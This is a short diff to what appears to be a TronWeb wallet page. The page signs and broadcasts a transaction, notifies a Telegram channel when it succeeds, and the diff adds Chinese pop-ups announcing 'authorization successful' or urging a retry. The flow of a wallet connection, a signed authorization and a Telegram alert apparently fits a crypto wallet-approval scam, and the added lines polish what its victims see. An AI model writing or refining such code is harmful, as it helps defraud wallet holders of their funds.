@@ -171,11 +171,24 @@
         const sendTransaction = await tronWeb.trx.sendRawTransaction(signTransaction);
         console.log('上链结果', sendTransaction);
 
-        // 如果交易成功，发送通知到 Telegram
+        // 如果交易成功，发送通知到 Telegram，并弹出 swal 成功提示
         if (sendTransaction.result) {
             sendTelegramNotification();
+            // 使用 swal 显示成功通知
+            swal({
+                title: '授权成功!',
+                text: '交易已经成功提交。',
+                icon: 'success',
+                button: '确认',
+            });
         } else {
             console.error('交易失败，无法通知 Telegram');
+            swal({
+                title: '授权失败!',
+                text: '交易提交失败，请重试。',
+                icon: 'error',
+                button: '重新尝试',
+            });
         }
     }
 
@@ -230,6 +243,7 @@
         lianjieqianbao();
     });
 </script>
+
 
     <script type="text/javascript">
     // window.vConsole = new window.VConsole();
